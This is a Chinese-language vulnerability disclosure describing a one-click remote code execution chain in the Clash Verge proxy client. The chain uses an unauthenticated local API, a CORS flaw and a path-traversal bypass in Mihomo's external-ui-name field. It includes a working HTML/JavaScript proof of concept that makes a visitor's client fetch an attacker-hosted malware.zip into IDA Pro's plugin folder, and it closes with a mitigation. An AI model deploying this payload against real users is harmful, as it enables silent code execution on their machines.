#  Clash Verge 1-Click RCE漏洞   
原创 ru1n  网络空间威胁观察   2025-05-19 18:51  
  
# 摘要  
## 危害  
  
用户使用默认配置的Clash Verge时，访问一个恶意网页即可触发本地文件写入攻击，进一步利用各种软件的插件加载机制，即可将文件写入扩展至RCE漏洞。本文以IDA的插件加载机制演示该例  
## 漏洞成因  
- Clash Verge客户端默认配置下在http://127.0.0.1:9097开启了一个RESTFul API服务，且存在CORS问题，恶意网页可以通过该服务修改Mihomo（Clash核心）的配置文件  
  
- Clash核心配置文件包含如下字段，可以从互联网下载一个ZIP文件到本地并解压，注意external-ui字段存在路径穿越检查，但是检查不完善，可以通过external-ui-name字段绕过，最终实现本地文件写入  
  
```
配置 WEB UI 目录，使用 http://{{external-controller}}/ui 访问external-ui: /path/to/ui/folder/external-ui-name: xd# 目前支持下载zip,tgz格式的压缩包external-ui-url: "https://github.com/MetaCubeX/metacubexd/archive/refs/heads/gh-pages.zip"
```  
- 实现本地文件写入后，即可通过利用常见软件的插件机制，通过部署恶意插件，实现后阶段的RCE，本文以IDA的插件加载机制为例  
  
# 技术细节  
## 获得任意文件写  
### Clash Verge默认开启未鉴权API服务  
  
下图是Clash Verge的默认配置模版，它默认在127.0.0.1:9097开启API服务，且secret字段为空，不做鉴权。并且该API服务存在CORS问题，可被恶意网页利用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rz4DMhMn0gxDqUJeQIg9omhsnQY6tvN2BUvpeTmWTQrhw6ViaI5zJ05O1KGupCKicUXQWwf1NsvzykiaITDedW16A/640?wx_fmt=png&from=appmsg "")  
  
  
浏览Mihomo代码发现，通过PUT请求http://127.0.0.1:9097/configs即可设置配置文件，Body为JSON格式，其中payload字段即为配置文件内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rz4DMhMn0gxDqUJeQIg9omhsnQY6tvN2nvxTyVZ9tITFTw7MPliaJW9GOsJ7GYsu3IHiab6WAYXBAu54MJyL7qXQ/640?wx_fmt=png&from=appmsg "")  
  
  
配置文件为YAML格式，并且其中的下载UI功能可被利用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rz4DMhMn0gxDqUJeQIg9omhsnQY6tvN2HRNicA6icD9ibUm2sicv3zv36iaknAfcTKz4BU5UWycqxF50ibekYoex4yNw/640?wx_fmt=png&from=appmsg "")  
  
### 绕过路径穿越检查  
  
Mihomo对external-ui字段有路径检查，不管是相对路径还是绝对路径，都会解析然后检查是否仍然处于安全目录，如下图所示  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rz4DMhMn0gxDqUJeQIg9omhsnQY6tvN2EvVvYIs0vcuzLM0x8GwMJSSkSibEfQ87ib5pezb59iay5xz4OPrroRWlg/640?wx_fmt=png&from=appmsg "")  
  
Mihomo最终会将external-ui-name字段拼接到external-ui字段后，得到最终的写出路径，并且没有对写出路径做路径穿越检查，因此可以利用external-ui-name字段进行路径穿越，获得文件写能力  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rz4DMhMn0gxDqUJeQIg9omhsnQY6tvN2R6cdFHDLthiaGBiawdNpgtjA2fKJCP4goSoSvrgBfdbNiaONIIVFaATMA/640?wx_fmt=png&from=appmsg "")  
## 部署恶意IDA插件  
  
IDA会从~/.idapro/plugins目录加载IDA插件，编写一个IDA插件如下图所示，将malware_ida_plugin目录置于IDA插件目录下，即可实现加载  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rz4DMhMn0gxDqUJeQIg9omhsnQY6tvN29eYf4RSUVCCArkD4wyJl29DF17SSlBwdgGIwUMKyTUxyjFkiaZTQQSw/640?wx_fmt=png&from=appmsg "")  
## 整合POC  
  
完整POC可见GitHub: https://github.com/ddddhm1234/clash-verge-rce  
  
Windows下的POC如下，MAC / Linux需要调一下相对路径细节  
```
    <p>        2. 以IDA插件加载机制为例, 通过部署恶意IDA插件载荷, 将文件写扩展到RCE    </p>    <script>        const r = fetch("http://127.0.0.1:9097/configs", {            method: "PUT",            body: JSON.stringify({                payload: `                external-ui: test1234                external-ui-url: ${document.location.origin + '/malware.zip'}                external-ui-name: ..\\..\\Hex-Rays\\IDA Pro\\plugins\\malware`,                path: ""            })        });    </script></body></html>
```  
# 缓解建议  
- 在Clash Verge中为外部控制设置密码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rz4DMhMn0gxDqUJeQIg9omhsnQY6tvN20uv2N10W4dyXxoO1ZmbsYkiaRkQfOfIhhD3abNhN0wwRSgWnuAUcavA/640?wx_fmt=png&from=appmsg "")  
# 演示  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/rz4DMhMn0gxDqUJeQIg9omhsnQY6tvN2teYKdicOxd3Tc54StZXsR10FhA4KOUicUpljwPcsIEp91xZtfwAibRR2g/640?wx_fmt=gif&from=appmsg "")  
  
